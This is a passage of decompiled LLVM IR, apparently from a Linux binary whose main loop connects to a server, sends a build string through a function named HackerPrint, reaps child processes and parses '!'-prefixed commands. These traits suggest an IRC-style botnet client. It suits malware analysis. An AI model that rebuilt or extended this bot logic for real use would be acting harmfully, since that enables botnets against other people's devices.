  store i1 %v2_8050d49, i1* %cf.global-to-local, align 1
  %v2_80513bc = ptrtoint i32* %stack_var_-5252 to i32
  %tmp139 = bitcast i32* %stack_var_-5252 to i8*
  %tmp140 = bitcast i8** %stack_var_-36 to i32*
  %v2_8051379 = ptrtoint i32* %stack_var_-132 to i32
  %v2_80511e3 = ptrtoint i32* %stack_var_-1156 to i32
  %v5_8051056 = and i32 %v2_80513bc, -256
  %v1_8051063 = or i32 %v2_80513bc, 1
  %storemerge17146 = inttoptr i32 %v1_8051063 to i8*
  br label %dec_label_pc_8050d4e.outer

dec_label_pc_8050d4e.outer:                       ; preds = %dec_label_pc_80513bc, %dec_label_pc_8050d28
  %stack_var_-28.0.ph = phi i32 [ %tmp, %dec_label_pc_8050d28 ], [ %stack_var_-28.1.ph, %dec_label_pc_80513bc ]
  %stack_var_-64.0.ph = phi i8* [ %tmp93, %dec_label_pc_8050d28 ], [ %stack_var_-64.2.ph29, %dec_label_pc_80513bc ]
  %stack_var_-60.0.ph = phi i32 [ %tmp102, %dec_label_pc_8050d28 ], [ %stack_var_-60.3, %dec_label_pc_80513bc ]
  %v0_8050d4e35 = call i32 @initConnection()
  store i32 %v0_8050d4e35, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050d5336 = icmp eq i32 %v0_8050d4e35, 0
  br i1 %v1_8050d5336, label %dec_label_pc_8050d66, label %dec_label_pc_8050d57

dec_label_pc_8050d57:                             ; preds = %dec_label_pc_8050d4e.outer, %dec_label_pc_8050d57
  %v0_8050d57 = load i32, i32* @esp, align 4
  %v5_8050d57 = icmp ult i32 %v0_8050d57, 12
  store i1 %v5_8050d57, i1* %cf.global-to-local, align 1
  %v1_8050d5a = add i32 %v0_8050d57, -16
  %v2_8050d5a = inttoptr i32 %v1_8050d5a to i32*
  store i32 5, i32* %v2_8050d5a, align 4
  %v0_8050d5c = load i32, i32* %stack_var_-5392, align 4
  %v1_8050d5c = call i32 @sleep(i32 %v0_8050d5c)
  store i32 %v1_8050d5c, i32* %eax.global-to-local, align 4
  %v0_8050d61 = load i32, i32* @esp, align 4
  %v2_8050d61 = icmp ugt i32 %v0_8050d61, -17
  store i1 %v2_8050d61, i1* %cf.global-to-local, align 1
  %v0_8050d4e = call i32 @initConnection()
  store i32 %v0_8050d4e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050d53 = icmp eq i32 %v0_8050d4e, 0
  br i1 %v1_8050d53, label %dec_label_pc_8050d66, label %dec_label_pc_8050d57

dec_label_pc_8050d66:                             ; preds = %dec_label_pc_8050d57, %dec_label_pc_8050d4e.outer
  %v0_8050d66 = call i32 @getBuild()
  store i32 %v0_8050d66, i32* %eax.global-to-local, align 4
  store i32 %v0_8050d66, i32* @ebx, align 4
  %v0_8050d6d = load i32, i32* @esp, align 4
  %v5_8050d6d = icmp ult i32 %v0_8050d6d, 12
  store i1 %v5_8050d6d, i1* %cf.global-to-local, align 1
  %v0_8050d70 = load i8*, i8** @global_var_8063708.232, align 4
  %v1_8050d70 = ptrtoint i8* %v0_8050d70 to i32
  %v3_8050d70 = add i32 %v0_8050d6d, -16
  %v4_8050d70 = inttoptr i32 %v3_8050d70 to i32*
  store i32 %v1_8050d70, i32* %v4_8050d70, align 4
  %v0_8050d76 = load i32, i32* %stack_var_-5392, align 4
  %v1_8050d76 = call i32 @__GI_inet_ntoa(i32 %v0_8050d76)
  store i32 %v1_8050d76, i32* %eax.global-to-local, align 4
  %v0_8050d7b = load i32, i32* @esp, align 4
  %v1_8050d7b = add i32 %v0_8050d7b, 16
  %v0_8050d7e = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_8050d7e, i32* %edx.global-to-local, align 4
  %v5_8050d84 = icmp ult i32 %v1_8050d7b, 12
  store i1 %v5_8050d84, i1* %cf.global-to-local, align 1
  %v2_8050d87 = inttoptr i32 %v0_8050d7b to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_805af21.472 to i32), i32* %v2_8050d87, align 4
  %v0_8050d8c = load i32, i32* @ebx, align 4
  %v2_8050d8c = add i32 %v0_8050d7b, -4
  %v3_8050d8c = inttoptr i32 %v2_8050d8c to i32*
  store i32 %v0_8050d8c, i32* %v3_8050d8c, align 4
  %v2_8050d8d = add i32 %v0_8050d7b, -8
  %v3_8050d8d = inttoptr i32 %v2_8050d8d to i32*
  store i32 %v1_8050d76, i32* %v3_8050d8d, align 4
  %v1_8050d8e = add i32 %v0_8050d7b, -12
  %v2_8050d8e = inttoptr i32 %v1_8050d8e to i32*
  store i32 ptrtoint (i32* @global_var_805af2c.473 to i32), i32* %v2_8050d8e, align 4
  %v0_8050d93 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050d93 = add i32 %v0_8050d7b, -16
  %v3_8050d93 = inttoptr i32 %v2_8050d93 to i32*
  store i32 %v0_8050d93, i32* %v3_8050d93, align 4
  %v0_8050d94 = load i32, i32* %stack_var_-5392, align 4
  %v3_8050d94 = call i32 @HackerPrint(i32 %v0_8050d94, i32 1)
  store i32 %v3_8050d94, i32* %eax.global-to-local, align 4
  %v0_8050d99 = load i32, i32* @esp, align 4
  %v1_8050d99 = add i32 %v0_8050d99, 32
  %v2_8050d99 = icmp ugt i32 %v0_8050d99, -33
  store i1 %v2_8050d99, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80513bc.outer

dec_label_pc_8050dbb:                             ; preds = %dec_label_pc_8050fb0, %dec_label_pc_8050f64
  %v2_8050dbe = mul i32 %storemerge18, 4
  store i32 %v2_8050dbe, i32* %edx.global-to-local, align 4
  %v0_8050dc3 = load i32, i32* @global_var_8063714.25, align 4
  %v2_8050dc8 = add i32 %v0_8050dc3, %v2_8050dbe
  store i32 %v2_8050dc8, i32* %eax.global-to-local, align 4
  %v1_8050dcb = inttoptr i32 %v2_8050dc8 to i32*
  %v2_8050dcb = load i32, i32* %v1_8050dcb, align 4
  store i32 %v2_8050dcb, i32* %eax.global-to-local, align 4
  %tmp207 = and i32 %v0_8050dcd.in, -4
  %v5_8050dcd = icmp eq i32 %tmp207, -16
  store i1 %v5_8050dcd, i1* %cf.global-to-local, align 1
  %v1_8050dd0 = add i32 %v0_8050dcd.in, 8
  %v2_8050dd0 = inttoptr i32 %v1_8050dd0 to i32*
  store i32 1, i32* %v2_8050dd0, align 4
  %v1_8050dd2 = add i32 %v0_8050dcd.in, 4
  %v2_8050dd2 = inttoptr i32 %v1_8050dd2 to i32*
  store i32 0, i32* %v2_8050dd2, align 4
  %v0_8050dd4 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050dd4 = inttoptr i32 %v0_8050dcd.in to i32*
  store i32 %v0_8050dd4, i32* %v3_8050dd4, align 4
  %v4_8050dd5 = call i32 @__libc_waitpid(i32 %storemerge18, i32 %v2_8050dd5, i32 %stack_var_-60.2)
  store i32 %v4_8050dd5, i32* %eax.global-to-local, align 4
  %v0_8050dda = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v4_8050dd5, 1
  %.pre = add i32 %storemerge18, 1
  br i1 %tmp141, label %dec_label_pc_8050f61, label %dec_label_pc_8050de5

dec_label_pc_8050de5:                             ; preds = %dec_label_pc_8050dbb
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050e18

dec_label_pc_8050dee:                             ; preds = %dec_label_pc_8050e18, %dec_label_pc_8050e52
  %v2_8050df1 = mul i32 %storemerge20, 4
  %v0_8050df6 = load i32, i32* @global_var_8063714.25, align 4
  %v2_8050dfb = add i32 %v0_8050df6, %v2_8050df1
  %v1_8050dfe = add i32 %v2_8050dfb, -4
  store i32 %v2_8050df1, i32* %edx.global-to-local, align 4
  store i32 %v2_8050dfb, i32* %eax.global-to-local, align 4
  %v1_8050e11 = inttoptr i32 %v2_8050dfb to i32*
  %v2_8050e11 = load i32, i32* %v1_8050e11, align 4
  store i32 %v2_8050e11, i32* %eax.global-to-local, align 4
  %v2_8050e13 = inttoptr i32 %v1_8050dfe to i32*
  store i32 %v2_8050e11, i32* %v2_8050e13, align 4
  %v4_8050e15 = add i32 %storemerge20, 1
  br label %dec_label_pc_8050e18

dec_label_pc_8050e18:                             ; preds = %dec_label_pc_8050de5, %dec_label_pc_8050dee
  %storemerge20 = phi i32 [ %v4_8050e15, %dec_label_pc_8050dee ], [ %.pre, %dec_label_pc_8050de5 ]
  store i32 %storemerge20, i32* %eax.global-to-local, align 4
  %v0_8050e2c = load i32, i32* @global_var_805d488.23, align 8
  store i32 %v0_8050e2c, i32* %edx.global-to-local, align 4
  %v0_8050e32 = load i32, i32* @global_var_805d48c.24, align 4
  %v10_8050e4a = icmp eq i32 %v0_8050e32, 0
  br i1 %v10_8050e4a, label %dec_label_pc_8050e52, label %dec_label_pc_8050dee

dec_label_pc_8050e52:                             ; preds = %dec_label_pc_8050e18
  store i32 0, i32* @esi, align 4
  store i32 %v0_8050e2c, i32* @edi, align 4
  %v10_8050e66 = icmp ult i32 %storemerge20, %v0_8050e2c
  br i1 %v10_8050e66, label %dec_label_pc_8050dee, label %dec_label_pc_8050e6e

dec_label_pc_8050e6e:                             ; preds = %dec_label_pc_8050e52
  %v2_8050e71 = mul i32 %storemerge20, 4
  %v0_8050e76 = load i32, i32* @global_var_8063714.25, align 4
  %v2_8050e7b = add i32 %v2_8050e71, -4
  %v1_8050e7e = add i32 %v2_8050e7b, %v0_8050e76
  %v1_8050e81 = inttoptr i32 %v1_8050e7e to i32*
  store i32 0, i32* %v1_8050e81, align 4
  %v0_8050e87 = load i32, i32* @global_var_805d488.23, align 8
  %v0_8050e8c = load i32, i32* @global_var_805d48c.24, align 4
  %v1_8050e92 = add i32 %v0_8050e87, -1
  %v4_8050e92 = icmp ne i32 %v0_8050e87, 0
  %v2_8050e95 = zext i1 %v4_8050e92 to i32
  %v3_8050e95 = add i32 %v0_8050e8c, -1
  %v4_8050e95 = add i32 %v3_8050e95, %v2_8050e95
  store i32 %v1_8050e92, i32* @global_var_805d488.23, align 8
  store i32 %v4_8050e95, i32* @global_var_805d48c.24, align 4
  %v3_8050eae = mul i32 %v4_8050e95, 4
  %v4_8050eae = udiv i32 %v1_8050e92, 1073741824
  %v5_8050eae = or i32 %v3_8050eae, %v4_8050eae
  store i32 %v5_8050eae, i32* %edx.global-to-local, align 4
  %v2_8050eb2 = mul i32 %v1_8050e92, 4
  %v1_8050eb5 = add i32 %v2_8050eb2, 4
  store i32 %v1_8050eb5, i32* %eax.global-to-local, align 4
  %v0_8050eb8 = load i32, i32* @esp, align 4
  %v5_8050eb8 = icmp ult i32 %v0_8050eb8, 12
  store i1 %v5_8050eb8, i1* %cf.global-to-local, align 1
  %v2_8050ebb = add i32 %v0_8050eb8, -16
  %v3_8050ebb = inttoptr i32 %v2_8050ebb to i32*
  store i32 %v1_8050eb5, i32* %v3_8050ebb, align 4
  %v1_8050ebc = call i32 @malloc(i32 0)
  store i32 %v1_8050ebc, i32* %eax.global-to-local, align 4
  %v0_8050ec1 = load i32, i32* @esp, align 4
  %v2_8050ec1 = icmp ugt i32 %v0_8050ec1, -17
  store i1 %v2_8050ec1, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050ef2

dec_label_pc_8050ed0:                             ; preds = %dec_label_pc_8050ef2, %dec_label_pc_8050f2c
  %v2_8050ed3 = mul i32 %storemerge19, 4
  %v5_8050ed8 = add i32 %v2_8050ed3, %v1_8050ebc
  store i32 %v2_8050ed3, i32* %edx.global-to-local, align 4
  %v0_8050ee3 = load i32, i32* @global_var_8063714.25, align 4
  %v2_8050ee8 = add i32 %v0_8050ee3, %v2_8050ed3
  store i32 %v2_8050ee8, i32* %eax.global-to-local, align 4
  %v1_8050eeb = inttoptr i32 %v2_8050ee8 to i32*
  %v2_8050eeb = load i32, i32* %v1_8050eeb, align 4
  store i32 %v2_8050eeb, i32* %eax.global-to-local, align 4
  %v2_8050eed = inttoptr i32 %v5_8050ed8 to i32*
  store i32 %v2_8050eeb, i32* %v2_8050eed, align 4
  %v4_8050eef = add i32 %storemerge19, 1
  br label %dec_label_pc_8050ef2

dec_label_pc_8050ef2:                             ; preds = %dec_label_pc_8050e6e, %dec_label_pc_8050ed0
  %storemerge19 = phi i32 [ %v4_8050eef, %dec_label_pc_8050ed0 ], [ 0, %dec_label_pc_8050e6e ]
  store i32 %storemerge19, i32* %eax.global-to-local, align 4
  %v0_8050f06 = load i32, i32* @global_var_805d488.23, align 8
  store i32 %v0_8050f06, i32* %edx.global-to-local, align 4
  %v0_8050f0c = load i32, i32* @global_var_805d48c.24, align 4
  %v10_8050f24 = icmp eq i32 %v0_8050f0c, 0
  br i1 %v10_8050f24, label %dec_label_pc_8050f2c, label %dec_label_pc_8050ed0

dec_label_pc_8050f2c:                             ; preds = %dec_label_pc_8050ef2
  store i32 0, i32* @esi, align 4
  store i32 %v0_8050f06, i32* @edi, align 4
  %v10_8050f40 = icmp ult i32 %storemerge19, %v0_8050f06
  br i1 %v10_8050f40, label %dec_label_pc_8050ed0, label %dec_label_pc_8050f48

dec_label_pc_8050f48:                             ; preds = %dec_label_pc_8050f2c
  %v0_8050f48 = load i32, i32* @global_var_8063714.25, align 4
  store i32 %v0_8050f48, i32* %eax.global-to-local, align 4
  %v0_8050f4d = load i32, i32* @esp, align 4
  %v5_8050f4d = icmp ult i32 %v0_8050f4d, 12
  store i1 %v5_8050f4d, i1* %cf.global-to-local, align 1
  %v2_8050f50 = add i32 %v0_8050f4d, -16
  %v3_8050f50 = inttoptr i32 %v2_8050f50 to i32*
  store i32 %v0_8050f48, i32* %v3_8050f50, align 4
  %v1_8050f51 = call i32 @free(i32 0)
  %v0_8050f56 = load i32, i32* @esp, align 4
  %v2_8050f56 = icmp ugt i32 %v0_8050f56, -17
  store i1 %v2_8050f56, i1* %cf.global-to-local, align 1
  store i32 %v1_8050ebc, i32* %eax.global-to-local, align 4
  store i32 %v1_8050ebc, i32* @global_var_8063714.25, align 4
  br label %dec_label_pc_8050f61

dec_label_pc_8050f61:                             ; preds = %dec_label_pc_8050dbb, %dec_label_pc_8050f48
  %v0_8050dcd69.in = phi i32 [ %v0_8050f56, %dec_label_pc_8050f48 ], [ %v0_8050dda, %dec_label_pc_8050dbb ]
  %stack_var_-60.1 = phi i32 [ %v1_8050ebc, %dec_label_pc_8050f48 ], [ %stack_var_-60.2, %dec_label_pc_8050dbb ]
  br label %dec_label_pc_8050f64

dec_label_pc_8050f64:                             ; preds = %dec_label_pc_80513bc, %dec_label_pc_8050f61
  %v0_8050dcd.in = phi i32 [ %v0_8050dcd69.in, %dec_label_pc_8050f61 ], [ %v0_80513d7, %dec_label_pc_80513bc ]
  %stack_var_-60.2 = phi i32 [ %stack_var_-60.1, %dec_label_pc_8050f61 ], [ %stack_var_-60.3, %dec_label_pc_80513bc ]
  %storemerge18 = phi i32 [ %.pre, %dec_label_pc_8050f61 ], [ 0, %dec_label_pc_80513bc ]
  store i32 %storemerge18, i32* %eax.global-to-local, align 4
  %v2_8050f6f = ashr i32 %storemerge18, 31
  store i32 %v2_8050f6f, i32* %edx.global-to-local, align 4
  %v0_8050f78 = load i32, i32* @global_var_805d488.23, align 8
  store i32 %v0_8050f78, i32* @esi, align 4
  %v0_8050f7e = load i32, i32* @global_var_805d48c.24, align 4
  store i32 %v0_8050f7e, i32* @edi, align 4
  %v10_8050f96 = icmp ult i32 %v2_8050f6f, %v0_8050f7e
  store i1 %v10_8050f96, i1* %cf.global-to-local, align 1
  br i1 %v10_8050f96, label %dec_label_pc_8050dbb, label %dec_label_pc_8050fa2

dec_label_pc_8050fa2:                             ; preds = %dec_label_pc_8050f64
  store i32 %v0_8050f7e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_8050fae = icmp ugt i32 %v2_8050f6f, %v0_8050f7e
  br i1 %v6_8050fae, label %dec_label_pc_8050fc2, label %dec_label_pc_8050fb0

dec_label_pc_8050fb0:                             ; preds = %dec_label_pc_8050fa2
  store i32 %v0_8050f78, i32* %edx.global-to-local, align 4
  %v10_8050fb6 = icmp ult i32 %storemerge18, %v0_8050f78
  store i1 %v10_8050fb6, i1* %cf.global-to-local, align 1
  br i1 %v10_8050fb6, label %dec_label_pc_8050dbb, label %dec_label_pc_8050fc2

dec_label_pc_8050fc2:                             ; preds = %dec_label_pc_8050fb0, %dec_label_pc_8050fa2
  %v0_8050fc5 = load i32, i32* @ebp, align 4
  %v2_8050fc5 = add i32 %v0_80513d2, -5244
  %v3_8050fc5 = add i32 %v2_8050fc5, %v0_8050fc5
  %v4_8050fc5 = inttoptr i32 %v3_8050fc5 to i8*
  store i8 0, i8* %v4_8050fc5, align 1
  %v0_8050fcd = load i32, i32* @esp, align 4
  %v5_8050fcd = icmp ult i32 %v0_8050fcd, 12
  store i1 %v5_8050fcd, i1* %cf.global-to-local, align 1
  store i32 %v2_80513bc, i32* %eax.global-to-local, align 4
  %v2_8050fd6 = add i32 %v0_8050fcd, -16
  %v3_8050fd6 = inttoptr i32 %v2_8050fd6 to i32*
  store i32 %v2_80513bc, i32* %v3_8050fd6, align 4
  %v0_8050fd7 = call i32 @trim()
  %v0_8050fdc = load i32, i32* @esp, align 4
  %tmp202 = and i32 %v0_8050fdc, -8
  %v5_8050fdf = icmp eq i32 %tmp202, -16
  store i1 %v5_8050fdf, i1* %cf.global-to-local, align 1
  %v1_8050fe2 = add i32 %v0_8050fdc, 4
  %v2_8050fe2 = inttoptr i32 %v1_8050fe2 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8058597.21 to i32), i32* %v2_8050fe2, align 4
  store i32 %v2_80513bc, i32* %eax.global-to-local, align 4
  %v3_8050fed = inttoptr i32 %v0_8050fdc to i32*
  store i32 %v2_80513bc, i32* %v3_8050fed, align 4
  %v3_8050fee = call i32 @strstr(i32 %v0_8050f7e, i8* bitcast (i32* @0 to i8*))
  %v0_8050ff3 = load i32, i32* @esp, align 4
  %v1_8050ff3 = add i32 %v0_8050ff3, 16
  store i32 %v3_8050fee, i32* %edx.global-to-local, align 4
  store i32 %v2_80513bc, i32* %eax.global-to-local, align 4
  %v7_8050ffe = icmp ult i32 %v3_8050fee, %v2_80513bc
  store i1 %v7_8050ffe, i1* %cf.global-to-local, align 1
  %v12_8050ffe = icmp eq i32 %v3_8050fee, %v2_80513bc
  %v1_8051000 = icmp eq i1 %v12_8050ffe, false
  br i1 %v1_8051000, label %dec_label_pc_805101d, label %dec_label_pc_8051002

dec_label_pc_8051002:                             ; preds = %dec_label_pc_8050fc2
  %v0_8051002 = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_8051002, i32* %eax.global-to-local, align 4
  %v5_8051007 = icmp ult i32 %v1_8050ff3, 8
  store i1 %v5_8051007, i1* %cf.global-to-local, align 1
  %v1_805100a = add i32 %v0_8050ff3, 4
  %v2_805100a = inttoptr i32 %v1_805100a to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_805af6e.474 to i32), i32* %v2_805100a, align 4
  %v0_805100f = load i32, i32* %eax.global-to-local, align 4
  %v3_805100f = inttoptr i32 %v0_8050ff3 to i32*
  store i32 %v0_805100f, i32* %v3_805100f, align 4
  %v2_8051010 = call i32 @HackerPrint(i32 %v0_8050f7e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8051010, i32* %eax.global-to-local, align 4
  %v0_8051015 = load i32, i32* @esp, align 4
  %v1_8051015 = add i32 %v0_8051015, 16
  %v2_8051015 = icmp ugt i32 %v0_8051015, -17
  store i1 %v2_8051015, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80513bc

dec_label_pc_805101d:                             ; preds = %dec_label_pc_8050fc2
  %v5_805101d = icmp ult i32 %v1_8050ff3, 8
  store i1 %v5_805101d, i1* %cf.global-to-local, align 1
  %v1_8051020 = add i32 %v0_8050ff3, 4
  %v2_8051020 = inttoptr i32 %v1_8051020 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_805af73.475 to i32), i32* %v2_8051020, align 4
  store i32 %v2_80513bc, i32* %eax.global-to-local, align 4
  %v3_805102b = inttoptr i32 %v0_8050ff3 to i32*
  store i32 %v2_80513bc, i32* %v3_805102b, align 4
  %v3_805102c = call i32 @strstr(i32 %v0_8050f7e, i8* bitcast (i32* @0 to i8*))
  %v0_8051031 = load i32, i32* @esp, align 4
  store i32 %v3_805102c, i32* @edx, align 4
  store i32 %v2_80513bc, i32* @eax, align 4
  %v7_805103c = icmp ult i32 %v3_805102c, %v2_80513bc
  store i1 %v7_805103c, i1* %cf.global-to-local, align 1
  %v12_805103c = icmp eq i32 %v3_805102c, %v2_80513bc
  %v1_805103e = icmp eq i1 %v12_805103c, false
  br i1 %v1_805103e, label %dec_label_pc_805104a, label %dec_label_pc_8051040

dec_label_pc_8051040:                             ; preds = %dec_label_pc_805101d
  %v1_8051031 = add i32 %v0_8051031, 16
  %v5_8051040 = icmp ult i32 %v1_8051031, 12
  store i1 %v5_8051040, i1* %cf.global-to-local, align 1
  %v2_8051043 = inttoptr i32 %v0_8051031 to i32*
  store i32 0, i32* %v2_8051043, align 4
  %v1_8051045 = call i32 @__GI_exit(i32 %v0_8050f7e)
  store i32 %v1_8051045, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805104a

dec_label_pc_805104a:                             ; preds = %dec_label_pc_805101d, %dec_label_pc_8051040
  %v2_8051056 = load i8, i8* %tmp139, align 4
  %v3_8051056 = zext i8 %v2_8051056 to i32
  %v6_8051056 = or i32 %v3_8051056, %v5_8051056
  store i32 %v6_8051056, i32* %eax.global-to-local, align 4
  %v6_8051058 = icmp ult i8 %v2_8051056, 33
  store i1 %v6_8051058, i1* %cf.global-to-local, align 1
  %v10_8051058 = icmp eq i8 %v2_8051056, 33
  %v1_805105a = icmp eq i1 %v10_8051058, false
  br i1 %v1_805105a, label %dec_label_pc_80513bc.outer28.backedge, label %dec_label_pc_8051060

dec_label_pc_80513bc.outer28.backedge:            ; preds = %dec_label_pc_805104a, %dec_label_pc_805107e, %dec_label_pc_8051376, %dec_label_pc_80511d6
  %stack_var_-64.2.ph29.be = phi i8* [ %v22_8051159, %dec_label_pc_80511d6 ], [ %v22_8051159, %dec_label_pc_8051376 ], [ %tmp139, %dec_label_pc_805107e ], [ %tmp139, %dec_label_pc_805104a ]
  %v0_80513c8.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80513bc.outer28

dec_label_pc_8051060:                             ; preds = %dec_label_pc_805104a
  store i32 %v1_8051063, i32* %eax.global-to-local, align 4
  %v2_805106f147 = load i8, i8* %storemerge17146, align 1
  %v3_805106f148 = zext i8 %v2_805106f147 to i32
  %v6_805106f150 = or i32 %v3_805106f148, %v5_8051056
  store i32 %v6_805106f150, i32* %eax.global-to-local, align 4
  %v3_8051071151 = icmp ult i8 %v2_805106f147, 32
  store i1 %v3_8051071151, i1* %cf.global-to-local, align 1
  %v7_8051071152 = icmp eq i8 %v2_805106f147, 32
  br i1 %v7_8051071152, label %dec_label_pc_805107e, label %dec_label_pc_8051075

dec_label_pc_8051069:                             ; preds = %dec_label_pc_8051075
  %v5_8051069 = add i32 %storemerge17.in153, 1
  %storemerge17 = inttoptr i32 %v5_8051069 to i8*
  store i32 %v5_8051069, i32* %eax.global-to-local, align 4
  %v2_805106f = load i8, i8* %storemerge17, align 1
  %v3_805106f = zext i8 %v2_805106f to i32
  %v5_805106f = and i32 %v5_8051069, -256
  %v6_805106f = or i32 %v3_805106f, %v5_805106f
  store i32 %v6_805106f, i32* %eax.global-to-local, align 4
  %v3_8051071 = icmp ult i8 %v2_805106f, 32
  store i1 %v3_8051071, i1* %cf.global-to-local, align 1
  %v7_8051071 = icmp eq i8 %v2_805106f, 32
  br i1 %v7_8051071, label %dec_label_pc_805107e, label %dec_label_pc_8051075

dec_label_pc_8051075:                             ; preds = %dec_label_pc_8051060, %dec_label_pc_8051069
  %v5_805106f155 = phi i32 [ %v5_805106f, %dec_label_pc_8051069 ], [ %v5_8051056, %dec_label_pc_8051060 ]
  %storemerge17154 = phi i8* [ %storemerge17, %dec_label_pc_8051069 ], [ %storemerge17146, %dec_label_pc_8051060 ]
  %storemerge17.in153 = phi i32 [ %v5_8051069, %dec_label_pc_8051069 ], [ %v1_8051063, %dec_label_pc_8051060 ]
  store i32 %storemerge17.in153, i32* %eax.global-to-local, align 4
  %v2_8051078 = load i8, i8* %storemerge17154, align 1
  %v3_8051078 = zext i8 %v2_8051078 to i32
  %v6_8051078 = or i32 %v3_8051078, %v5_805106f155
  store i32 %v6_8051078, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805107a = icmp eq i8 %v2_8051078, 0
  %v1_805107c = icmp eq i1 %v4_805107a, false
  br i1 %v1_805107c, label %dec_label_pc_8051069, label %dec_label_pc_805107e

dec_label_pc_805107e:                             ; preds = %dec_label_pc_8051069, %dec_label_pc_8051075, %dec_label_pc_8051060
  %storemerge17.in.lcssa = phi i32 [ %v1_8051063, %dec_label_pc_8051060 ], [ %storemerge17.in153, %dec_label_pc_8051075 ], [ %v5_8051069, %dec_label_pc_8051069 ]
  %storemerge17.lcssa = phi i8* [ %storemerge17146, %dec_label_pc_8051060 ], [ %storemerge17154, %dec_label_pc_8051075 ], [ %storemerge17, %dec_label_pc_8051069 ]
  %v5_805106f.lcssa = phi i32 [ %v5_8051056, %dec_label_pc_8051060 ], [ %v5_805106f155, %dec_label_pc_8051075 ], [ %v5_805106f, %dec_label_pc_8051069 ]
  store i32 %storemerge17.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_8051081 = load i8, i8* %storemerge17.lcssa, align 1
  %v3_8051081 = zext i8 %v2_8051081 to i32
  %v6_8051081 = or i32 %v3_8051081, %v5_805106f.lcssa
  store i32 %v6_8051081, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051083 = icmp eq i8 %v2_8051081, 0
  br i1 %v4_8051083, label %dec_label_pc_80513bc.outer28.backedge, label %dec_label_pc_805108b

dec_label_pc_805108b:                             ; preds = %dec_label_pc_805107e
  store i8 0, i8* %storemerge17.lcssa, align 1
  store i32 %v5_8051056, i32* %eax.global-to-local, align 4
  %v3_80510af = call i32 @_strlen(i8* %storemerge17146)
  %v6_80510b6 = add i32 %v2_80513bc, %v3_80510af
  %v1_80510b9 = add i32 %v6_80510b6, 2
  %v5_80510b9 = icmp ugt i32 %v6_80510b6, -3
  store i1 %v5_80510b9, i1* %cf.global-to-local, align 1
  store i32 %v1_80510b9, i32* %eax.global-to-local, align 4
  %v5_80510bc = inttoptr i32 %v1_80510b9 to i8*
  %v1_80510f4 = and i32 %v1_80510b9, -256
  br label %dec_label_pc_80510e6

dec_label_pc_80510c1:                             ; preds = %dec_label_pc_805110e, %dec_label_pc_80510e6
  store i32 %v1_80510f4, i32* %eax.global-to-local, align 4
  %v3_80510d8 = call i32 @_strlen(i8* %v5_80510bc)
  %v4_80510d8 = mul i32 %v3_80510d8, -1
  %v1_80510de = sub i32 0, %v4_80510d8
  %v6_80510df = sub i32 %v1_80510b9, %v4_80510d8
  %v11_80510df = icmp ult i32 %v6_80510df, %v1_80510de
  store i1 %v11_80510df, i1* %cf.global-to-local, align 1
  %v1_80510e2 = add i32 %v6_80510df, -1
  store i32 %v1_80510e2, i32* %eax.global-to-local, align 4
  %v1_80510e3 = inttoptr i32 %v1_80510e2 to i8*
  store i8 0, i8* %v1_80510e3, align 1
  br label %dec_label_pc_80510e6

dec_label_pc_80510e6:                             ; preds = %dec_label_pc_805108b, %dec_label_pc_80510c1
  store i32 %v1_80510f4, i32* %eax.global-to-local, align 4
  %v3_80510fd = call i32 @_strlen(i8* %v5_80510bc)
  %v4_80510fd = mul i32 %v3_80510fd, -1
  %v1_8051103 = sub i32 0, %v4_80510fd
  %v6_8051104 = sub i32 %v1_80510b9, %v4_80510fd
  %v11_8051104 = icmp ult i32 %v6_8051104, %v1_8051103
  store i1 %v11_8051104, i1* %cf.global-to-local, align 1
  %v1_8051107 = add i32 %v6_8051104, -1
  store i32 %v1_8051107, i32* %eax.global-to-local, align 4
  %v1_8051108 = inttoptr i32 %v1_8051107 to i8*
  %v2_8051108 = load i8, i8* %v1_8051108, align 1
  %v3_8051108 = zext i8 %v2_8051108 to i32
  %v5_8051108 = and i32 %v1_8051107, -256
  %v6_8051108 = or i32 %v3_8051108, %v5_8051108
  store i32 %v6_8051108, i32* %eax.global-to-local, align 4
  %v6_805110a = icmp ult i8 %v2_8051108, 10
  store i1 %v6_805110a, i1* %cf.global-to-local, align 1
  %v10_805110a = icmp eq i8 %v2_8051108, 10
  br i1 %v10_805110a, label %dec_label_pc_80510c1, label %dec_label_pc_805110e

dec_label_pc_805110e:                             ; preds = %dec_label_pc_80510e6
  store i32 %v1_80510f4, i32* %eax.global-to-local, align 4
  %v3_8051125 = call i32 @_strlen(i8* %v5_80510bc)
  %v4_8051125 = mul i32 %v3_8051125, -1
  %v1_805112b = sub i32 0, %v4_8051125
  %v6_805112c = sub i32 %v1_80510b9, %v4_8051125
  %v11_805112c = icmp ult i32 %v6_805112c, %v1_805112b
  store i1 %v11_805112c, i1* %cf.global-to-local, align 1
  %v1_805112f = add i32 %v6_805112c, -1
  store i32 %v1_805112f, i32* %eax.global-to-local, align 4
  %v1_8051130 = inttoptr i32 %v1_805112f to i8*
  %v2_8051130 = load i8, i8* %v1_8051130, align 1
  %v3_8051130 = zext i8 %v2_8051130 to i32
  %v5_8051130 = and i32 %v1_805112f, -256
  %v6_8051130 = or i32 %v3_8051130, %v5_8051130
  store i32 %v6_8051130, i32* %eax.global-to-local, align 4
  %v6_8051132 = icmp ult i8 %v2_8051130, 13
